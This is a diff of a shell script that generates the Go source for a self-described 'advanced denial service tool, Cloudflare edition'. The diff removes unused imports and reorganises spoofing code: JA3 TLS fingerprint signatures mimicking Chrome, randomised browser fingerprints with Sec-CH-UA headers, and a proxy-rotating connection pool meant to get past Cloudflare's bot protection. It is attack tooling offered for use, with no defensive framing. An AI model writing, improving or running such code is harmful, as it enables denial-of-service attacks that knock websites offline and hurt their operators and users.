@@ -24,23 +24,18 @@ echo -e "${WHITE}  ADVANCED DENIAL SERVICE TOOL - CLOUDFLARE EDITION${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file with advanced Cloudflare bypass
+# Create main.go file with advanced Cloudflare bypass (CLEAN version - no unused imports)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating advanced main.go...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
-	"bufio"
-	"bytes"
 	"compress/flate"
 	"compress/gzip"
 	"crypto/rand"
 	"crypto/sha256"
 	"crypto/tls"
-	"encoding/base64"
-	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/big"
@@ -59,7 +54,6 @@ import (
 	"time"
 
 	"golang.org/x/net/http2"
-	"golang.org/x/net/http2/hpack"
 )
 
 var (
@@ -145,21 +139,6 @@ var (
 		{"Priority": "u=0, i"},
 	}
 
-	// Application headers
-	appHeaders = []map[string]string{
-		{"X-Requested-With": "XMLHttpRequest"},
-		{"X-CSRF-Token": ""},
-		{"X-API-Key": ""},
-	}
-
-	// Cloudflare specific headers
-	cfHeaders = []map[string]string{
-		{"CF-Connecting-IP": ""},
-		{"CF-IPCountry": ""},
-		{"CF-Ray": ""},
-		{"CF-Visitor": ""},
-	}
-
 	proxies         []string
 	proxyMu         sync.RWMutex
 	proxyIndex      uint64
@@ -171,44 +150,6 @@ var (
 	colorMu         sync.Mutex
 
 	// JA3 signatures
-	ja3Signatures []JA3Signature
-)
-
-type JA3Signature struct {
-	Name             string
-	CipherSuites     []uint16
-	CurvePreferences []tls.CurveID
-	NextProtos       []string
-	MinVersion       uint16
-	MaxVersion       uint16
-}
-
-type ConnectionPool struct {
-	clients    []*http.Client
-	counter    uint64
-	mu         sync.RWMutex
-	size       int
-	useProxy   bool
-	targetHost string
-	useCookies bool
-	jar        *cookiejar.Jar
-}
-
-type BrowserFingerprint struct {
-	UserAgent      string
-	AcceptLanguage string
-	Platform       string
-	DoNotTrack     string
-	SecCHUA        string
-	SecCHUAArch    string
-	SecCHUABitness string
-	SecCHUAMobile  string
-	SecCHUAPlatform string
-	SecCHUAPlatformVersion string
-}
-
-func init() {
-	// Initialize JA3 signatures
 	ja3Signatures = []JA3Signature{
 		{
 			Name: "Chrome 141-150",
@@ -262,6 +203,36 @@ func init() {
 			MaxVersion:       tls.VersionTLS13,
 		},
 	}
+)
+
+type JA3Signature struct {
+	Name             string
+	CipherSuites     []uint16
+	CurvePreferences []tls.CurveID
+	NextProtos       []string
+	MinVersion       uint16
+	MaxVersion       uint16
+}
+
+type ConnectionPool struct {
+	clients    []*http.Client
+	counter    uint64
+	mu         sync.RWMutex
+	size       int
+	useProxy   bool
+	targetHost string
+	useCookies bool
+	jar        *cookiejar.Jar
+}
+
+type BrowserFingerprint struct {
+	UserAgent      string
+	AcceptLanguage string
+	Platform       string
+	DoNotTrack     string
+	SecCHUA        string
+	SecCHUAMobile  string
+	SecCHUAPlatform string
 }
 
 func generateBrowserFingerprint() *BrowserFingerprint {
@@ -290,11 +261,8 @@ func generateBrowserFingerprint() *BrowserFingerprint {
 	if strings.Contains(ua, "Chrome") {
 		version := extractChromeVersion(ua)
 		bf.SecCHUA = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, version, version)
-		bf.SecCHUAArch = `"x86"`
-		bf.SecCHUABitness = `"64"`
 		bf.SecCHUAMobile = "?0"
 		bf.SecCHUAPlatform = `"Windows"`
-		bf.SecCHUAPlatformVersion = `"15.0.0"`
 	} else if strings.Contains(ua, "Firefox") {
 		bf.SecCHUA = `"Not?A_Brand";v="99", "Firefox";v="135"`
 		bf.SecCHUAMobile = "?0"
